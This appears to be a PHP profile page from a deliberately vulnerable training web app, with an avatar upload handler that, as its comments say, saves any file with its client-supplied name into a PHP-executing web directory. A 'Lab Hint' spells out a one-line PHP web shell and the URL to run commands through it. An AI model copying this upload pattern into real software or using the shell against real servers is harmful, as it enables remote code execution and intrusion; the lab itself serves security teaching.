<?php
require_login();
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar'])) {
    // VULN: arbitrary file upload with NO extension allow-list, saved with
    // the client-supplied filename straight into the public, PHP-executing
    // webroot. Unlike the Node/Flask versions of this app, an uploaded
    // "shell.php" here is immediately remote code execution the moment
    // anyone (including the attacker) visits /uploads/shell.php — Apache's
    // PHP module will execute it like any other script.
    if ($_FILES['avatar']['error'] !== UPLOAD_ERR_OK) {
        $_SESSION['profile_flash'] = ['type' => 'error', 'text' => 'Please choose a file to upload.'];
    } else {
        $uploadDir = __DIR__ . '/../uploads';
        if (!is_dir($uploadDir)) {
            @mkdir($uploadDir, 0777, true);
        }
        $filename = $_FILES['avatar']['name'];
        $dest = $uploadDir . '/' . $filename;
        if (move_uploaded_file($_FILES['avatar']['tmp_name'], $dest)) {
            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'avif'], true)) {
                $uid = (int)($_SESSION['user']['id'] ?? 0);
                if ($uid > 0) {
                    $conn = db_conn();
                    $stmt = $conn->prepare('UPDATE users SET avatar = ? WHERE id = ?');
                    $stmt->bind_param('si', $filename, $uid);
                    $stmt->execute();
                    $stmt->close();
                    $conn->close();
                    $_SESSION['user']['avatar'] = $filename;
                }
                $_SESSION['profile_flash'] = ['type' => 'success', 'text' => 'Profile avatar updated (/uploads/' . $filename . ')'];
            } else {
                $_SESSION['profile_flash'] = ['type' => 'success', 'text' => 'Uploaded to /uploads/' . $filename];
            }
        } else {
            $_SESSION['profile_flash'] = ['type' => 'error', 'text' => 'Upload failed. Check permissions on /uploads/.'];
        }
    }
    header('Location: /?page=pages/profile');
    exit;
}

$flash = $_SESSION['profile_flash'] ?? null;
unset($_SESSION['profile_flash']);
$u = current_user();
$uid = (int)($u['id'] ?? 0);
$uStats = db_raw_query("
    SELECT
      (SELECT COUNT(*) FROM threads WHERE user_id = $uid) AS threads_count,
      (SELECT COUNT(*) FROM replies WHERE user_id = $uid) AS replies_count
")->fetch_assoc();
?>

<div class="card profile-card">
  <div class="profile-hero">
    <div class="profile-identity">
      <?= vf_avatar($u['username'], 'lg', $u['avatar'] ?? null) ?>
      <div>
        <h1 class="profile-name"><?= htmlspecialchars($u['username']) ?></h1>
        <div class="profile-meta">
          <span><?= htmlspecialchars($u['email'] ?? '') ?></span>
          <span class="badge <?= ($u['role'] ?? '') === 'admin' ? 'badge-admin' : 'badge-user' ?>">
            <?= htmlspecialchars($u['role'] ?? 'user') ?>
          </span>
        </div>
      </div>
    </div>
    <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
      <?php if (($u['role'] ?? '') === 'admin'): ?>
        <a href="/admin/users.php" class="btn btn-danger btn-sm">Open Admin Panel</a>
      <?php endif; ?>
      <a href="/?page=pages/home" class="btn btn-secondary btn-sm">&larr; Threads</a>
    </div>
  </div>

  <div class="profile-body">
    <?php if (!empty($u['bio'])): ?>
      <p class="profile-bio"><?= htmlspecialchars($u['bio']) ?></p>
    <?php endif; ?>

    <div class="profile-stats">
      <div class="stat-mini">
        <span class="stat-mini-val"><?= (int)$uStats['threads_count'] ?></span>
        <span class="stat-mini-label">Threads</span>
      </div>
      <div class="stat-mini">
        <span class="stat-mini-val"><?= (int)$uStats['replies_count'] ?></span>
        <span class="stat-mini-label">Replies</span>
      </div>
      <div class="stat-mini">
        <span class="stat-mini-val">#<?= $uid ?></span>
        <span class="stat-mini-label">User ID</span>
      </div>
    </div>

    <?php if ($flash): ?>
      <div class="alert <?= $flash['type'] === 'success' ? 'alert-success' : 'alert-error' ?>">
        <?= htmlspecialchars($flash['text']) ?>
      </div>
    <?php endif; ?>

    <form method="post" enctype="multipart/form-data">
      <div class="upload-box">
        <div class="upload-box-head">
          <?= vf_icon('upload', 18) ?>
          <label for="avatar-file" style="margin: 0;">Upload Profile Avatar</label>
        </div>
        <input id="avatar-file" type="file" name="avatar">
        <div class="upload-actions">
          <span class="upload-note">Files are stored under <code>/uploads/</code></span>
          <button type="submit">
            <?= vf_icon('upload', 15) ?>
            <span>Upload Avatar</span>
          </button>
        </div>
      </div>
    </form>

    <details class="lab-hint">
      <summary>
        <span>Lab Hint: Arbitrary File Upload</span>
        <span>&#9662;</span>
      </summary>
      <div class="lab-hint-body">
        Try uploading a file named <code>shell.php</code> containing <code>&lt;?php system($_GET['c']); ?&gt;</code>, then visit <code>/uploads/shell.php?c=id</code>.
      </div>
    </details>
  </div>
</div>
